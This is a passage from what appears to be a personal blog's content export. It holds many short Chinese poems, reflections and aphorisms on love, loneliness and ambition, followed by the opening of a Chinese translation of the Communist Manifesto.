href=\"#愁\" class=\"headerlink\" title=\"愁\"></a>愁</h1><p>又几多愁，旧日春光洒满头。<br>满城悲絮，一口浊气牵肠去。</p>\n<h1 id=\"深夜-1\"><a href=\"#深夜-1\" class=\"headerlink\" title=\"深夜\"></a>深夜</h1><p>星河旧冷夜成眠，月殿回暖梦无时。<br>啼喃起伏阵阵音，淡落霜打枯枯意。</p>\n<h1 id=\"秋知佛\"><a href=\"#秋知佛\" class=\"headerlink\" title=\"秋知佛\"></a>秋知佛</h1><p>千灯湖塔亮人家，西樵百步承风雨。<br>祖庭怒火显武世，中南海里演国仇</p>\n<h1 id=\"明志\"><a href=\"#明志\" class=\"headerlink\" title=\"明志\"></a>明志</h1><p>誓要乾坤清，付予天地明。<br>纵有千百恨，不惧万世冤。</p>\n<h1 id=\"上班去\"><a href=\"#上班去\" class=\"headerlink\" title=\"上班去\"></a>上班去</h1><p>蓝甲战衣穿胸膛，风雨雷电伴耳旁。<br>朝圣路上多诘难，不觉已到昆仑虚。</p>\n<h1 id=\"好走\"><a href=\"#好走\" class=\"headerlink\" title=\"好走\"></a>好走</h1><p>事别经年，我该如何称呼你的青春，是献给了理想，还是献祭了理想？</p>\n<h1 id=\"好走-1\"><a href=\"#好走-1\" class=\"headerlink\" title=\"好走\"></a>好走</h1><p>轻风细雨，杂音喧闹，满身泥泞的少年，无人问津的路！</p>\n<h1 id=\"愧然也\"><a href=\"#愧然也\" class=\"headerlink\" title=\"愧然也\"></a>愧然也</h1><p>半月封尘半月圆，清风协隐清风喧。<br>藏月愧日量归期，自咏半月还锦瑟。</p>\n<h1 id=\"深夜-2\"><a href=\"#深夜-2\" class=\"headerlink\" title=\"深夜\"></a>深夜</h1><p>吾夜观星象，必当亡于辰时三刻。<br>当神游物外，飞天巡视列御四方。</p>\n<h1 id=\"成功的方法只有一个-就是以你喜欢的方式活下去\"><a href=\"#成功的方法只有一个-就是以你喜欢的方式活下去\" class=\"headerlink\" title=\"成功的方法只有一个,就是以你喜欢的方式活下去\"></a>成功的方法只有一个,就是以你喜欢的方式活下去</h1><p>坚信无论经过多少黑暗与苦难，那传说了无数次，忽悠了无数回，却始终未见的太平盛世，终会到来。<br>–魏忠贤时代。</p>\n<h1 id=\"你的BGM\"><a href=\"#你的BGM\" class=\"headerlink\" title=\"你的BGM\"></a>你的BGM</h1><p>青云天上敬豪客，话聊红尘琴一曲。<br>日月星辰路上人，悠扬大风歌一首。</p>\n<h1 id=\"生来悲徨\"><a href=\"#生来悲徨\" class=\"headerlink\" title=\"生来悲徨\"></a>生来悲徨</h1><p>心中一片悲凉意，化作此刻剑来时。<br>持剑纵横捭阖家，难敌千夫幻心指。</p>\n<h1 id=\"感\"><a href=\"#感\" class=\"headerlink\" title=\"感\"></a>感</h1><p>人从悲哀中落落大方走出来<br>就是艺术家</p>\n<h1 id=\"金帛春日远游记\"><a href=\"#金帛春日远游记\" class=\"headerlink\" title=\"金帛春日远游记.\"></a>金帛春日远游记.</h1><p>与友别赠青云.至真情且意坚.<br>常思决绝不下,神游天寻古月.<br>念念欲归未得,悔与不深之言.<br>有前程可奔赴,有岁月可回首.</p>\n<h1 id=\"再遇\"><a href=\"#再遇\" class=\"headerlink\" title=\"再遇\"></a>再遇</h1><p>愿你自再遇见，无波澜，问安如友。</p>\n<h1 id=\"论韭菜\"><a href=\"#论韭菜\" class=\"headerlink\" title=\"论韭菜\"></a>论韭菜</h1><p>我向左边看是七暗公主，我向右边看是佳俏’公子’。用色彩勾勒的七彩祥云，加了一勺暗元素，还有一个缺失的人格，这是一个完美状态。用波澜不惊的态度，遮盖讶疑的双眼，又是上扬的嘴角，仿佛看了透少年的拘谨。这些事情，请孩子们啊尽早体会，若是到了索然无味的阶段，心率会一直保持在50下，这才是真正的死了，我问一句，你死了吗？你默不作声，不敢相信自己死了似的，承认它又太难了，就这样不上不下的做根韭菜，又有什么不好。谁能回答呢？</p>\n<h1 id=\"感-1\"><a href=\"#感-1\" class=\"headerlink\" title=\"感\"></a>感</h1><p>春雨    催    眠人，樱花     打    诗雨。<br>青峰    惘    然已，天桥     过    路己。</p>\n<h1 id=\"感-2\"><a href=\"#感-2\" class=\"headerlink\" title=\"感\"></a>感</h1><p>又是春一季，风与花不同。孤独又上了一层楼，交流的成本竟然花掉了我的三块竹子，原以为包容是可以解决一切问题的，后来发现，还是俗入人心，骚人与自由才是完美的一对，那堪堪的能让自己悲伤呢。每夜一丝尘，腐腐眼眸里。金时烟花放，寄入浮光里！</p>\n<p>我会忘了与你的一切！</p>\n<h1 id=\"情\"><a href=\"#情\" class=\"headerlink\" title=\"情\"></a>情</h1><p>弯眉掷枪手执箭，寒风不挡霓裳舞。百战金装身上衣，别有一番英武气！</p>\n<p>认识一妹子,因其特殊经历,好久想给其作诗,但一直无缘灵感.今一朝闻面,10分钟内做出一首打油诗.做的不好,讨大家个乐,小年吉祥.也祝你新的一年事事顺心!</p>\n<h1 id=\"乐\"><a href=\"#乐\" class=\"headerlink\" title=\"乐\"></a>乐</h1><p>文墨我所忆，才女我所追。窈窕我所赏，一生我所执。</p>\n<h1 id=\"只如初见\"><a href=\"#只如初见\" class=\"headerlink\" title=\"只如初见\"></a>只如初见</h1><p>纤弱细骨，柔英无眉，以淡淡热香之力，使人不敢妄动。惟只按下躁动之心，以求诸佛佑我行！轻嘤袅袅，婷婷扑面，左右似是仙鹤隐空，虚中望人定身。仙女下凡不外如是，尝过人间百事，更有一丝韵殇其中。醉不可收，溺惘在深谭。</p>\n<h1 id=\"佳句\"><a href=\"#佳句\" class=\"headerlink\" title=\"佳句\"></a>佳句</h1><p>春寒料峭深深绿，姹紫嫣红百样好！</p>\n<p>天空之城初相识，恨晚晴霞彩云追。</p>\n<h1 id=\"心境之路\"><a href=\"#心境之路\" class=\"headerlink\" title=\"心境之路\"></a>心境之路</h1><p>在这繁华的盛世里，逐利，是我对自己画的圈，一辈子还逃的开吗？剑胆破晓时刻，在求剑船上已注定，不近！伸着脸喝着红酒，暗想还有哪一计可以让我走的更顺心，想到最后，一句随心。是谁繁华了你的寂寞-第三章第10节</p>\n<h1 id=\"思国\"><a href=\"#思国\" class=\"headerlink\" title=\"思国\"></a>思国</h1><p>深夜识鬼忘川雨，撩动人心古琴音。</p>\n<p>百年一梦鼓浪屿，至今思迁一海峡！</p>\n<h1 id=\"暖\"><a href=\"#暖\" class=\"headerlink\" title=\"暖\"></a>暖</h1><p>禾木剜心红耳汤，前世茫茫不思量。暖人暖世煖春风，相知相伴香一生！</p>\n<h1 id=\"一次失恋\"><a href=\"#一次失恋\" class=\"headerlink\" title=\"一次失恋\"></a>一次失恋</h1><p>夏初，是悲伤的开始，刚刚孕育的花朵，经不起暴晒，退缩成为了我的常态，没有茁壮的枝干，又怎能生出依偎来？是我不好，没有让你快乐的勇气，一切的道歉都像是在对自己诉说。余生的红色都给了这些时光，再也不会有咸涩滴落！</p>\n<h1 id=\"三句情诗\"><a href=\"#三句情诗\" class=\"headerlink\" title=\"三句情诗\"></a>三句情诗</h1><p>深夜</p>\n<p>想你和梦</p>\n<p>都开始了</p>\n<h1 id=\"深爱\"><a href=\"#深爱\" class=\"headerlink\" title=\"深爱\"></a>深爱</h1><p>爱的那么深刻，又几遇能相释怀，倾尽所有告诉你的眼睛，我的味道与你相融。彼此纠缠不管是相克犯煞，还是怨恨有憎，都逃不开内心的焦灼。与你以礼相敬，即隔山海，也爱你之所爱，亲你之所亲。﻿</p>\n<p>我愿与你桃花三千时相伴，更白守少年誓言。</p>\n<h1 id=\"2017初雪\"><a href=\"#2017初雪\" class=\"headerlink\" title=\"2017初雪\"></a>2017初雪</h1><p>深夜下雪，思故人。归来归来，仍落地不见，我思念你，思念你如雪默，寂静无声，冷彻寒骨。再见你，白雪送佳人，萧瑟独行客。</p>\n<h1 id=\"归来\"><a href=\"#归来\" class=\"headerlink\" title=\"归来\"></a>归来</h1><p>尘埃浮现，镜台亦拂拭轻吟。良月当空，往事都随风过处。饭香浓思，深潭有雾气缭绕。八齿齐放，脸颊也鱼尾三重。十年啄灼，栖息好静安书斋。残棋四九，缺一是生离死别。千里不息，天河游鱼龙豚舞。百世聚仁，情且行德怨恩仇。</p>\n<h1 id=\"是谁繁华了我的寂寞-2017-11-7\"><a href=\"#是谁繁华了我的寂寞-2017-11-7\" class=\"headerlink\" title=\"是谁繁华了我的寂寞 2017.11.7\"></a>是谁繁华了我的寂寞 2017.11.7</h1><p>思绪混乱,各种负面情绪:语点的反应(我说出每句话的中心意思),丑陋的外表,邋遢的气息,颓废的心里,蠢弱的身体,活不到的快乐,得不到的尊重,歇斯底里的嘲讽.各种各样的交织,像黑暗一样吞噬着我.</p>\n<p>每一个小时我都会有,就这样活着有什么意思,这样的想法,剩下的59分59秒,我都在去努力改变一下.记录一下,虽然转瞬即逝.很现实,很悲哀.</p>\n<p>都在妄想不劳而获,都在想当一只蛀虫.心底里的想法,毫不犹豫的展现出来,仅仅伤害了别人吗?是否考虑过谁在背负着这些因果,谁在地狱里被红莲业火燃烧焦灼,谁在承受人情的无穷纠葛.</p>\n<p>浮夸的表演,不得不让我把你想得丑陋一些.造作的语句,冷漠的表情,都是对这个世界有情的伤害.</p>\n<p>就这样吧,就这样吧,我总是安于现状,不思改变,不求理解.</p>\n<p>秋雨  ∙  心安!</p>\n<h1 id=\"是谁繁华了你的寂寞-第三章第一节\"><a href=\"#是谁繁华了你的寂寞-第三章第一节\" class=\"headerlink\" title=\"是谁繁华了你的寂寞-第三章第一节\"></a>是谁繁华了你的寂寞-第三章第一节</h1><p>我的坚持得到过所有人的”背叛”，我所坚持下去的勇气，是无人可阻的！我可以抛弃所有的荣华富贵和身康体健，但我唯独不可以抛弃这股来自灵魂的信仰！自成以来，赶走无为，摘掉庸碌，救赎自我。世界与我再无敌意！</p>\n<h1 id=\"四月独好！\"><a href=\"#四月独好！\" class=\"headerlink\" title=\"四月独好！\"></a>四月独好！</h1><p>岁月停格刹那间，含苞晨光醉人眼。夜有蛙叫蚊来扰，叹出时光荏苒去！</p>\n<h1 id=\"怨我\"><a href=\"#怨我\" class=\"headerlink\" title=\"怨我\"></a>怨我</h1><p>怨我生在迷惘中，怨我献身欲望中，怨我轻轻折恨中，怨我重重复复中！怨我争争坚韧中，怨我事事躬亲中，怨我笑颜如花中，怨我俯首为牛中，怨我轮回天地中，怨我万事皆缠中，怨我生生世世中！</p>\n<h1 id=\"谢\"><a href=\"#谢\" class=\"headerlink\" title=\"谢\"></a>谢</h1><p>借朋友之口: 冰雪掩月夜，津口渡船归.少时鲤鱼跃,老来经天纬.</p>\n<h1 id=\"悦\"><a href=\"#悦\" class=\"headerlink\" title=\"悦\"></a>悦</h1><p>四月多才子，佳人好衣装。本来无一事，人悦花羞藏！</p>\n<h1 id=\"雨\"><a href=\"#雨\" class=\"headerlink\" title=\"雨\"></a>雨</h1><p>伞下一朵白莲花，惹人娇恼羞羞羞。风中几片墨绿叶，摇曳倩影闪闪闪！</p>\n<h1 id=\"忆\"><a href=\"#忆\" class=\"headerlink\" title=\"忆\"></a>忆</h1><p>月上柳梢冷，芽露浅浅白。沁雾深潭中，西施尤为醉！</p>\n<h1 id=\"游雨花新感\"><a href=\"#游雨花新感\" class=\"headerlink\" title=\"游雨花新感\"></a>游雨花新感</h1><p>始于茶树，进闻桂王；丁香五月，感人肺腑；层层叠嶂，不见高楼；春光乍现，寺隐绿深；九转十八，雨花阁下，樱白漫天，万物复苏！参天环绕，不见日照，景貌大纲，尽收眼下；﻿</p>\n<p>阶梯而下，又一乐处；重游温故，知新知心！</p>\n<h1 id=\"元宵节快乐\"><a href=\"#元宵节快乐\" class=\"headerlink\" title=\"元宵节快乐\"></a>元宵节快乐</h1><p>昨夜星辰，满腹经纶对谁说。今日元宵，灯舞闹心阑珊处！</p>\n<h1 id=\"思\"><a href=\"#思\" class=\"headerlink\" title=\"思\"></a>思</h1><p>就在那晚月圆，我赶走了所有思绪，独宠嫦娥！</p>\n<h1 id=\"失眠\"><a href=\"#失眠\" class=\"headerlink\" title=\"失眠\"></a>失眠</h1><p>锦衣插笔，夜断魂殇。百年的思绪，混乱了盛世。如云，如风，如空。不尽来，去不留！佛心命涅槃，金甲医疾患！何物可入命？无物可入心？</p>\n<h1 id=\"忏\"><a href=\"#忏\" class=\"headerlink\" title=\"忏\"></a>忏</h1><p>梦入伯牙子期风,醒时山伯英台墓.</p>\n<p>不甘流水无情花,深解琴瑟琵琶声.</p>\n<h1 id=\"未遇\"><a href=\"#未遇\" class=\"headerlink\" title=\"未遇\"></a>未遇</h1><p>未曾相遇却相念,十迁别离青负恨.</p>\n<p>老来应当苦含泪,不如当年勇依恒.</p>\n<p>自解:不曾相遇的你我,却甚是思念对方,你乔迁了十处,我一处不曾去看过,也一处不曾与我相近,你我的青年时光背负了莫大的恨意!当年使用的勇气,到老了,是否应该为此哭泣?现在想想,不如恒心立地,我心坚守!</p>\n<h1 id=\"游紫金山\"><a href=\"#游紫金山\" class=\"headerlink\" title=\"游紫金山\"></a>游紫金山</h1><p>玄武微凉沁颜色，颊红雾凌览人间。坡俏绳桥遮林叶，樱陀雨落急落石！</p>\n<h1 id=\"愿\"><a href=\"#愿\" class=\"headerlink\" title=\"愿\"></a>愿</h1><p>剪不清，理还乱！真心希望能遇到梦幻一般的女子，就像莲花般温柔。百合般天使！</p>\n<p>希望遇见我的人都能消灾解祸！</p>\n<p>熙熙攘攘七夕节，凄凄惨惨一人过！若要人生最美丽，还需痴心对嫦娥！</p>\n<p>我要去南方,在一个人多且少的地方,种下桂花树,等有缘人,取心而放!</p>\n<h1 id=\"秋游玄水坑\"><a href=\"#秋游玄水坑\" class=\"headerlink\" title=\"秋游玄水坑\"></a>秋游玄水坑</h1><p>碧水褐阳三丈起，青黄交接秋不寒。</p>\n<p>风南微兮发飞扬，鹤女婀娜语祥平！</p>\n<h1 id=\"明\"><a href=\"#明\" class=\"headerlink\" title=\"明\"></a>明</h1><p>一梦生,一梦明!</p>\n<h1 id=\"品\"><a href=\"#品\" class=\"headerlink\" title=\"品\"></a>品</h1><p>闻到花香，可以写诗，算是极好！看到食物，可以填腹，算是很好！偶吐心声，心情畅快，算是一般！夜思己身，痛哭流涕，算是极差！</p>\n<h1 id=\"困\"><a href=\"#困\" class=\"headerlink\" title=\"困\"></a>困</h1><p>天下谁人不是君，莫道君行独异人！</p>\n<p>偶得秦淮所思</p>\n<p>干了这一碗豪气，饮下此三杯九霄！你我共创义气盟，各自封王天下平！</p>\n<h1 id=\"农民工\"><a href=\"#农民工\" class=\"headerlink\" title=\"农民工\"></a>农民工</h1><p>一地凉席，铺尽了辛酸。</p>\n<h1 id=\"困-1\"><a href=\"#困-1\" class=\"headerlink\" title=\"困\"></a>困</h1><p>忆娇，品事之不公，扩心之舞想，然后能静心，而后明性，之后知路，最后行计</p>\n<h1 id=\"困-2\"><a href=\"#困-2\" class=\"headerlink\" title=\"困\"></a>困</h1><p>世人无人问津你的孤独，所以你觉得与生俱来，这只不过是人性凉薄的体现，而不是孤独主义者！孤独主义是王者的风范，是诗人的愤世，是凡人的常伴，是自己的静安！</p>\n<h1 id=\"困-3\"><a href=\"#困-3\" class=\"headerlink\" title=\"困\"></a>困</h1><p>那些卑微的梦想，被我藏匿到自己都触摸不到的地方！</p>\n<h1 id=\"眼\"><a href=\"#眼\" class=\"headerlink\" title=\"眼\"></a>眼</h1><p>那噙着水雾的深潭，是最触动心灵的地方！</p>\n<h1 id=\"忆-1\"><a href=\"#忆-1\" class=\"headerlink\" title=\"忆\"></a>忆</h1><p>每一句话都包含了你的感情,或浪荡不羁,或意气风发,或疯疯癫癫,或娇憨不已,让人情不自禁的喝起了春药一样的你!</p>\n<h1 id=\"短句\"><a href=\"#短句\" class=\"headerlink\" title=\"短句\"></a>短句</h1><p>空间的错误，造就了回忆的沙漏；时间的折射，成就了回忆的美好！与君本陌路，断桥偏相逢.不求人相伴，但求心相印。(张益铭补)</p>\n<h1 id=\"思-1\"><a href=\"#思-1\" class=\"headerlink\" title=\"思\"></a>思</h1><p>是谁折笔，洒了墨滴，断了回忆！望窗外秋雨，裂肝肠肺腑，融化了血水，染彩了宣墨！</p>\n<h1 id=\"梦青\"><a href=\"#梦青\" class=\"headerlink\" title=\"梦青\"></a>梦青</h1><p>人生如梦，聚散分离， 朝如春花幕凋零，几许相聚， 几许分离，缘来缘去岂随心。 青丝白发转眼间，漠然回首，几许沧桑在心头。 独自泪空流。(楼主之弟薛冰:我还是没那么坚强，感觉眼泪好不值钱，呵呵)!</p>\n<h1 id=\"思-2\"><a href=\"#思-2\" class=\"headerlink\" title=\"思\"></a>思</h1><p>地位人格有高低耶？曰：前低后高！又问：地位人格有贵贱耶？曰：前贵后贱！</p>\n<p>身份决定地位，地位决定品味，而不是智慧与道德决定的！智慧给予了人心明暗，道德给予了人心善恶，而不是身份与地位给予的！</p>\n<p>存在着为自己着想的人是我的一件幸事，存在着可以为他着想的我，也是我的一件幸事！</p>\n<p>错的对的，不是浮云，不是神马，而是你的，真实感受。对的错的，不是假的，不是虚的，就是你的，地位形势。错了有错，不需改正，不要证据，这是你的，醉生梦死。对了又对，心中有数，横眉冷对，不是你的，无上天堂！</p>\n<p>叠层阴霾，冷意秋节，灰冷；霞光薄薄，上善遮天，阴冷；己道奇罪，忠义仁耻，笑冷！</p>\n<p>梳发笼仙，盘于腰间，玉质共贵气天然，瓜鹅并舞曲一身！</p>\n<h1 id=\"火风\"><a href=\"#火风\" class=\"headerlink\" title=\"火风\"></a>火风</h1><p>天空黑色羽，灰烬了大地。飘逸过村来，落地风寂灭。</p>\n<h1 id=\"千里念\"><a href=\"#千里念\" class=\"headerlink\" title=\"千里念\"></a>千里念</h1><p>人隔千里外，又在思念谁？春去花已落，夏来树正茂。感叹好时节，莫要独修愁！</p>\n<h1 id=\"曹贼赋\"><a href=\"#曹贼赋\" class=\"headerlink\" title=\"曹贼赋\"></a>曹贼赋</h1><p>沛国生阿瞒，欲得盛名问许邵。五色禁洛阳，方知其胆能。欲学荆轲志，可负天下人。檄诏出陈留，挥师虎牢关。孤军西讨义，无人可比之！借得天子令，征得北方侯！</p>\n<p>北方有霸主，官渡一战之。得意春风铜雀台，欲锁二乔天下惊！马蹄奔蹴急，临门下荆州。三尺青釭剑，吐哺归心愿。再次击敌，犹如神助！投鞭断江意，撩发狂不知。位高气已傲，是为英姿败。壮心在千里，后人谁可知？一成一败间，功过今人论？</p>\n<h1 id=\"思-3\"><a href=\"#思-3\" class=\"headerlink\" title=\"思\"></a>思</h1><p>对于强者来说，陌生人的生命怎么有他自己付出的代价珍贵呢！</p>\n<p>胜利者是不该被正义所指责的!</p>\n<p>人间毕竟我就来一次，你就不能对我好点！</p>\n<p>你所期待的并不会立即实现，反而你所将要遗忘的会给你惊喜，是否参杂了命运的缘分，我不得而知！</p>\n<p>向前路叹一句，怎可在懈怠中度过余生！</p>\n<p>夜的辉煌，带给我莫名的惧怕，又给了我安谧的勇气，静心明性！</p>\n<p>悠然一梦，梦到了集市大会，梦到了瀑布千米，深山别墅！</p>\n<p>亦悠悠声漾，亦英英闻妙！</p>\n<p>一直支持我的，难道只有我的信念吗？我不想其他人都是我信念的排外者，说实话，我从高中就一直在抱怨，因为我的起点很低，但我不希望我的地位在社会上仍然很低，成长虽然需要时间，但我时间不多！我想成为更强大的东西，对啊！我想更强大！强大！强大到我成为一个独裁者！</p>\n<p>情之一字，跨过了日月星辰，走过了千山万水，沉在了人间烟火之中！</p>\n<h1 id=\"厌\"><a href=\"#厌\" class=\"headerlink\" title=\"厌\"></a>厌</h1><p>不要把钻石般的美好，去和你丑陋卑鄙龌龊的心灵相比。你身上渗出的毒液会沾染这个世界，还会空气传播的。</p>\n<p>不要让我的眼神鄙视你，好吗！</p>\n<p>每天深夜你们都是怎么抵抗孤独的呢？心痛到想歇斯底里的哭泣！</p>\n<h1 id=\"困-4\"><a href=\"#困-4\" class=\"headerlink\" title=\"困\"></a>困</h1><p>探索深渊的人，其天敌唯有光明！</p>\n<p>总是有一种失落在不经意间表露无疑。</p>\n<p>莫道今时离别恨，幸有知音懂我心！</p>\n<p>心有三千繁华结,身居盘虎卧龙气.</p>\n<p>要经得起寂寞，禁得起孤独的繁华。</p>\n<p>大丈夫生于盛世，当持戒子书，以训天下！</p>\n<p>时间谋杀了多少，在空间上能补足吗？</p>\n<p>如此卑微的我，在疯狂的贪欲下做出令人大吃一惊的结果（当然是让人嘲笑的事情）。命运真的不能更改吗？就像疯狂的地下城，疯狂的我。永远被系统所设定，映照在现实中。五年的压抑下我学会了很多，更让我明白伸手去践踏命运，掌握命运是会让人精神崩溃的。但—-我们就看着命运的手把自己推进无尽的深渊。不是的，他会让我更加的疯狂！给正在改变命运的朋友一句鼓励，不在沉默中呻吟，就在沉默中呐喊。</p>\n<p>每一个在这个世界行走的人，都有一个信念。他们或不被理解，或落魄，或遭到嘲笑，或遭受白眼，或被当作棋子，或被当作奴隶，或被反叛，或被围攻，但他们坚定，他们的苦楚也许普通人便能感受到，但他们的境界永远不是那些人可以理解的，他们的理想永远不可能被那些人触摸，他们与众不同。试图改变他们的人都是懦夫，是可耻者，那些人永远只能跟在他们的后面。仅仅献给独行者。</p>\n<p>生活的乐趣也许在于面对未知与恐惧，你会做出什么样的反应及思考！</p>\n<p>在黑暗中沉默太久，看世界的眼光都不对了！</p>\n<p>我的妄想症又加深了一步！奇迹，只在痛苦中诞生！</p>\n<p>择一城孤老!</p>\n<p>四六之都，应天一问？何日可期，？？？</p>\n<p>我奋斗了18年，不是为了和你一起喝喝咖啡那么简单!</p>\n<p>自由与快乐总是和任性相伴！</p>\n<p>总在开心时，时光漏出锋利的刀芒，恨不相逢未嫁时，远去换君一生安！</p>\n<p>生有所恋，却无所依！</p>\n<h1 id=\"忆-2\"><a href=\"#忆-2\" class=\"headerlink\" title=\"忆\"></a>忆</h1><p>记忆不曾忘却，回忆更增韵味。</p>\n<p>金辉满地，难得一厢思绪。</p>\n<p>我要向你表白，我每次遇见你心就会多跳几次，每次看见你就会忍不住想和你说话，每次说话就会有一种感觉，我不知道那是什么，但是我知道我好像了解你，理解你，喜欢你，爱上你！纪念我未恋先逝的爱情！</p>\n<p>等不尽的思念，扯不完的温柔！</p>\n<p>倚栏听风雨， 斜阳当空挂！</p>\n<p>我的信仰呀，你看到了吗？旅途正在走向正轨！前路仍是荆棘，但我已经有了方法，有了行动。</p>\n<p>三千繁华届，又起新征途！</p>\n<p>当我在深渊里望向那一缕阳光，我好像好想她！</p>\n<p>记忆封印在了虚空，我唯有想尽办法活下去，直到我能再爱你！</p>\n<p>你不懂我浅浅的忧伤，就像怀着香味的薰衣草，是远行的旅途，还是停下的脚步。残暑孤花婉辞唱，唯有末夏未凉人！</p>\n<h1 id=\"田香\"><a href=\"#田香\" class=\"headerlink\" title=\"田香\"></a>田香</h1><p>一身稻草香味，满天蜻蜓飞舞；灌道长河微冷，萤火停留多久？</p>\n<h1 id=\"闯江南\"><a href=\"#闯江南\" class=\"headerlink\" title=\"闯江南\"></a>闯江南</h1><p>我乘马归去，但见黄花已落！</p>\n<p>一把刀，一颗脑袋，一身包袱业力，行走世间！</p>\n<p>拔刀欲平天下，文制按刀不出鞘。</p>\n<h1 id=\"明月思念\"><a href=\"#明月思念\" class=\"headerlink\" title=\"明月思念\"></a>明月思念</h1><p>今夜月将明，不忘相思泪。蓦然回首望月光，照相眸里，洒进心里。</p>\n<p>蓦然回头望月光，照进眸里，洒进心里。今夜月将明，不忘相思泪。</p>\n<h1 id=\"短句-1\"><a href=\"#短句-1\" class=\"headerlink\" title=\"短句\"></a>短句</h1><p>两盏灯笼血染，一双绣花底藏。</p>\n<p>斜雨桑叶，落了一抹风情！</p>\n<p>岩尖回首，唯有当时苦奋时,浪前观望，仅在偶尔独乐哉!(和旭注)</p>\n<p>于一古镇相遇，风姿摇曳，执扇在手，猛然展开，轻轻浮晃，日月开合！是最美的风景！</p>\n<p>孤独的路，总是前行者的欢场！</p>\n<p>想着你，就是繁华了寂寞！</p>\n<h1 id=\"语录\"><a href=\"#语录\" class=\"headerlink\" title=\"语录\"></a>语录</h1><p>天地为师，舍邻为友。</p>\n<p>夜半不归宿，只为明日恩。怀只感恩心，可受昼夜苦！</p>\n<p>君子爱财，取之有道；君子喜色，爱之有德。</p>\n<h1 id=\"双意\"><a href=\"#双意\" class=\"headerlink\" title=\"双意\"></a>双意</h1><p>瑟瑟萧风一杆抢，迷茫双眼寻与梦。何时修得人来时，沾得一枪洞中血。</p>\n<h1 id=\"乞公\"><a href=\"#乞公\" class=\"headerlink\" title=\"乞公\"></a>乞公</h1><p>楼前乞骨泣，楼上香四溢。看拆迁事宜，品人生住房。</p>\n<h1 id=\"逝流年\"><a href=\"#逝流年\" class=\"headerlink\" title=\"逝流年\"></a>逝流年</h1><p>折笔追忆，似水年华。情至于此，流年无痕。</p>\n<h1 id=\"长恨当年\"><a href=\"#长恨当年\" class=\"headerlink\" title=\"长恨当年\"></a>长恨当年</h1><p>半生两年一半，月半迷心，相思泪已。佳月披身，眼神浮空，六神无主，离心魂去，金香能否再吻？不知音，不知貌，忘名又忘姓。难恨天，难恨地，长恨己！</p>\n<h1 id=\"青葱迷茫\"><a href=\"#青葱迷茫\" class=\"headerlink\" title=\"青葱迷茫\"></a>青葱迷茫</h1><p>一心明月，奈何沟渠。奈奈心落，悲悲无情。人生二十年，只凉不悲，只欢不乐，只说不做。笔下纸上，赫然在目。</p>\n<h1 id=\"美色\"><a href=\"#美色\" class=\"headerlink\" title=\"美色\"></a>美色</h1><p>妖姬美色，难以忘却，当年的人，没有如此妖媚，却更加引人遐思！这么多年的你，堕落进了凡尘了吗？</p>\n"},{"title":"共产党宣言","date":"2020-05-08T03:41:32.000Z","_content":"\n# 共产党宣言\n\n\n\n\n\n　　一个幽灵，共产主义的幽灵，在欧洲游荡。为了对这个幽灵进行神圣的围剿，旧欧洲的一切势力，教皇和沙皇、梅特涅和基佐、法国的激进派和德国的警察，都联合起来了。\n　　有哪一个反对党不被它的当政的敌人骂为共产党呢？又有哪一个反对党不拿共产主义这个罪名去回敬更进步的反对党人和自己的反动敌人呢？\n　　从这一事实中可以得出两个结论：\n　　共产主义已经被欧洲的一切势力公认为一种势力；\n　　现在是共产党人向全世界公开说明自己的观点、自己的目的、自己的意图并且拿党自己的宣言来反驳关于共产主义幽灵的神话的时候了。\n　　为了这个目的，各国共产党人集会于伦敦，拟定了如下的宣言，用英文、法文、德文、意大利文、弗拉芒文和丹麦文公布于世。\n\n# 一、资产者和无产者\n\n\n　　至今一切社会的历史都是阶级斗争的历史。\n\n　　自由民和奴隶、贵族和平民、领主和农奴、行会师傅和帮工，一句话，压迫者和被压迫者，始终处于相互对立的地位，进行不断的、有时隐蔽有时公开的斗争，而每一次斗争的结局是整个社会受到革命改造或者斗争的各阶级同归于尽。\n\n　　在过去的各个历史时代，我们几乎到处都可以看到社会完全划分为各个不同的等级，看到社会地位分成的多种多样的层次。在古罗马，有贵族、骑士、平民、奴隶，在中世纪，有封建主、臣仆、行会师傅、帮工、农奴，而且几乎在每一个阶级内部又有一些特殊的阶层。\n\n　　从封建社会的灭亡中产生出来的现代资产阶级社会并没有消灭阶级对立。它只是用新的阶级、新的压迫条件、新的斗争形式代替了旧的。\n\n　　但是，我们的时代，资产阶级时代，却有一个特点：它使阶级对立简单化了。整个社会日益分裂为两大敌对的阵营，分裂为两大相互直接对立的阶级：资产阶级和无产阶级。\n\n　　从中世纪的农奴中产生了初期城市的城关市民；从这个市民等级中发展出最初的资产阶级分子。\n\n　　美洲的发现、绕过非洲的航行，给新兴的资产阶级开辟了新天地。东印度和中国的市场、美洲的殖民化、对殖民地的贸易、交换手段和一般的商品的增加，使商业、航海业和工业空前高涨，因而使正在崩溃的封建社会内部的革命因素迅速发展。\n\n　　以前那种封建的或行会的工业经营方式已经不能满足随着新市场的出现而增加的需求了。工场手工业代替了这种经营方式。行会师傅被工业的中间等级排挤掉了；各种行业组织之间的分工随着各个作坊内部的分工的出现而消失了。\n\n　　但是，市场总是在扩大，需求总是在增加。甚至工场手工业也不再能满足需要了。于是，蒸汽和机器引起了工业生产的革命。现代大工业化替了工场手工业；工业中的百万富翁，一支一支产业大军的首领，现代资产者，代替了工业的中间等级。\n\n　　大工业建立了由美洲的发现所准备好的世界市场。世界市场使商业、航海业和陆路交通得到了巨大的发展。这种发展又反过来促进了工业的扩展，同时，随着工业、商业、航海业和铁路的扩展，资产阶级也在同一程度上得到发展，增加自己的资本，把中世纪遗留下来的一切阶级都排挤到后面去。\n\n　　由此可见，现代资产阶级本身是一个长期发展过程的产物，是生产方式和交换方式的一系列变革的产物。\n\n　　资产阶级的这种发展的每一个阶段，都伴随着相应的政治上进展。它在封建主统治下是被压迫的等级，在公社里是武装的和自治的团体，在一些地方组成独立的城市共和国，在另一些地方组成君主国中的纳税的第三等级；后来，在工场手工业时期，它是等级制君主国或专制君主国中同贵族抗衡的势力，而且是大君主国的主要基础；最后，从大工业和世界市场建立的时候起，它在现代的代议制国家里夺得了独占的政治统治。现代的国家政权不过是管理整个资产阶级的共同事务的委员会罢了。\n\n　　资产阶级在历史上曾经起过非常革命的作用。\n\n　　